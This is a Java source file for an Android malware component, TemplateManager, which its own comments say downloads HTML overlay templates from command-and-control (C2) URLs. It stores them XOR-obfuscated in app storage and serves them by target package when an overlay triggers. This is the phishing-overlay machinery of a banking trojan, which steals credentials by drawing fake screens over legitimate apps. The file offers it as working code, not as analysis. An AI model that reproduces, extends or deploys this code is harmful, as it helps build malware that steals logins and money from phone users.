package com.fason.app.features.springe.templates;

import android.content.Context;
import android.text.TextUtils;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.locks.ReentrantReadWriteLock;

/**
 * TemplateManager — Handles lifecycle of HTML overlay templates.
 *
 * Responsibilities:
 * - Download templates from C2 URLs
 * - Cache templates in encrypted local storage
 * - Template versioning (only update when version changes)
 * - Template lookup by ID, category, or target package
 * - Memory caching for fast retrieval during overlay triggers
 *
 * Thread-safe: all operations protected by ReentrantReadWriteLock.
 */
public final class TemplateManager {

    private static final String TAG = "TemplateManager";

    private static final String TEMPLATES_DIR = "springe_templates";
    private static final String INDEX_FILE = "templates_index.json";
    private static final int MAX_TEMPLATE_SIZE = 512 * 1024; // 512KB per template

    private final File templatesDir;
    private final Map<String, TemplateEntry> cache = new HashMap<>();
    private final ReentrantReadWriteLock lock = new ReentrantReadWriteLock();

    public TemplateManager(Context context) {
        this.templatesDir = new File(context.getFilesDir(), TEMPLATES_DIR);
        if (!templatesDir.exists()) {
            templatesDir.mkdirs();
        }
        loadIndex();
    }

    /**
     * Save a template from raw HTML content.
     */
    public void saveTemplate(String templateId, String html, int version) {
        if (TextUtils.isEmpty(templateId) || TextUtils.isEmpty(html)) return;

        lock.writeLock().lock();
        try {
            String hash = sha256(html);
            TemplateEntry entry = new TemplateEntry(templateId, version, hash, System.currentTimeMillis());

            // Save HTML to file
            File templateFile = getTemplateFile(templateId);
            try (FileOutputStream fos = new FileOutputStream(templateFile)) {
                byte[] data = html.getBytes("UTF-8");
                // XOR obfuscation
                for (int i = 0; i < data.length; i++) {
                    data[i] ^= 0xA3;
                }
                fos.write(data);
                fos.flush();
            }

            // Update cache
            cache.put(templateId, entry);

            // Persist index
            saveIndex();

            Log.d(TAG, "Template saved: " + templateId + " (v" + version + ", " + html.length() + " bytes)");

        } catch (Exception e) {
            Log.e(TAG, "Failed to save template: " + templateId, e);
        } finally {
            lock.writeLock().unlock();
        }
    }

    /**
     * Fetch a template from a URL and cache it.
     */
    public void fetchFromUrl(String templateId, String url, int version) {
        if (TextUtils.isEmpty(url)) return;

        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setInstanceFollowRedirects(true);

            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                try (InputStream is = conn.getInputStream()) {
                    byte[] data = new byte[MAX_TEMPLATE_SIZE];
                    int read = is.read(data);
                    if (read > 0) {
                        String html = new String(data, 0, read, "UTF-8");
                        saveTemplate(templateId, html, version);
                    }
                }
            }
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Failed to fetch template from URL: " + url, e);
        }
    }

    /**
     * Get the HTML content of a template from cache or disk.
     */
    public String getTemplateHtml(String templateId) {
        if (TextUtils.isEmpty(templateId)) return null;

        lock.readLock().lock();
        try {
            // Check cache first
            if (!cache.containsKey(templateId)) {
                // Try loading from disk
                loadTemplateFromDisk(templateId);
            }

            TemplateEntry entry = cache.get(templateId);
            if (entry == null) return null;

            // Read from file
            File templateFile = getTemplateFile(templateId);
            if (!templateFile.exists()) {
                cache.remove(templateId);
                return null;
            }

            try (FileInputStream fis = new FileInputStream(templateFile)) {
                byte[] data = new byte[(int) templateFile.length()];
                fis.read(data);
                // De-obfuscate
                for (int i = 0; i < data.length; i++) {
                    data[i] ^= 0xA3;
                }
                return new String(data, "UTF-8");
            } catch (Exception e) {
                Log.e(TAG, "Failed to read template file: " + templateId, e);
                return null;
            }

        } catch (Exception e) {
            Log.e(TAG, "Error getting template: " + templateId, e);
            return null;
        } finally {
            lock.readLock().unlock();
        }
    }

    /**
     * Delete a template from cache and disk.
     */
    public void deleteTemplate(String templateId) {
        lock.writeLock().lock();
        try {
            cache.remove(templateId);
            File templateFile = getTemplateFile(templateId);
            if (templateFile.exists()) templateFile.delete();
            saveIndex();
            Log.d(TAG, "Template deleted: " + templateId);
        } finally {
            lock.writeLock().unlock();
        }
    }

    /**
     * List all cached templates.
     */
    public JSONArray listTemplates() {
        lock.readLock().lock();
        try {
            JSONArray arr = new JSONArray();
            for (Map.Entry<String, TemplateEntry> e : cache.entrySet()) {
                TemplateEntry entry = e.getValue();
                JSONObject obj = new JSONObject();
                obj.put("id", e.getKey());
                obj.put("version", entry.version);
                obj.put("hash", entry.hash);
                obj.put("cachedAt", entry.cachedAt);
                File f = getTemplateFile(e.getKey());
                obj.put("size", f.exists() ? f.length() : 0);
                arr.put(obj);
            }
            return arr;
        } catch (Exception e) {
            return new JSONArray();
        } finally {
            lock.readLock().unlock();
        }
    }

    public int getTemplateCount() {
        lock.readLock().lock();
        try {
            return cache.size();
        } finally {
            lock.readLock().unlock();
        }
    }

    /**
     * Remove all templates.
     */
    public void clear() {
        lock.writeLock().lock();
        try {
            cache.clear();
            File[] files = templatesDir.listFiles();
            if (files != null) {
                for (File f : files) {
                    if (f.isFile() && !f.getName().equals(INDEX_FILE)) {
                        f.delete();
                    }
                }
            }
            saveIndex();
        } finally {
            lock.writeLock().unlock();
        }
    }

    /* ─── Internal ─── */

    private File getTemplateFile(String templateId) {
        // Sanitize template ID for filesystem
        String safeName = templateId.replaceAll("[^a-zA-Z0-9_\\-]", "_");
        return new File(templatesDir, safeName + ".html");
    }

    private void loadIndex() {
        lock.writeLock().lock();
        try {
            File indexFile = new File(templatesDir, INDEX_FILE);
            if (!indexFile.exists()) return;

            try (FileInputStream fis = new FileInputStream(indexFile)) {
                byte[] data = new byte[(int) indexFile.length()];
                fis.read(data);
                String json = new String(data, "UTF-8");
                JSONArray arr = new JSONArray(json);
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject obj = arr.getJSONObject(i);
                    TemplateEntry entry = TemplateEntry.fromJson(obj);
                    if (entry != null) {
                        cache.put(entry.id, entry);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to load template index", e);
        } finally {
            lock.writeLock().unlock();
        }
    }

    private void saveIndex() {
        try {
            JSONArray arr = new JSONArray();
            for (Map.Entry<String, TemplateEntry> e : cache.entrySet()) {
                arr.put(e.getValue().toJson());
            }
            File indexFile = new File(templatesDir, INDEX_FILE);
            try (FileOutputStream fos = new FileOutputStream(indexFile)) {
                fos.write(arr.toString(2).getBytes("UTF-8"));
                fos.flush();
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to save template index", e);
        }
    }

    private void loadTemplateFromDisk(String templateId) {
        File templateFile = getTemplateFile(templateId);
        if (!templateFile.exists()) return;

        // Entry exists in index but not in memory cache — reload index
        loadIndex();
    }

    private static String sha256(String text) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(text.getBytes("UTF-8"));
            StringBuilder hex = new StringBuilder();
            for (byte b : hash) {
                hex.append(String.format("%02x", b & 0xFF));
            }
            return hex.toString();
        } catch (Exception e) {
            return "";
        }
    }

    /* ─── Entry Data Class ─── */

    private static final class TemplateEntry {
        final String id;
        final int version;
        final String hash;
        final long cachedAt;

        TemplateEntry(String id, int version, String hash, long cachedAt) {
            this.id = id;
            this.version = version;
            this.hash = hash;
            this.cachedAt = cachedAt;
        }

        JSONObject toJson() {
            try {
                JSONObject obj = new JSONObject();
                obj.put("id", id);
                obj.put("version", version);
                obj.put("hash", hash);
                obj.put("cachedAt", cachedAt);
                return obj;
            } catch (Exception e) { return new JSONObject(); }
        }

        static TemplateEntry fromJson(JSONObject obj) {
            try {
                return new TemplateEntry(
                    obj.optString("id", ""),
                    obj.optInt("version", 0),
                    obj.optString("hash", ""),
                    obj.optLong("cachedAt", 0)
                );
            } catch (Exception e) { return null; }
        }
    }
}
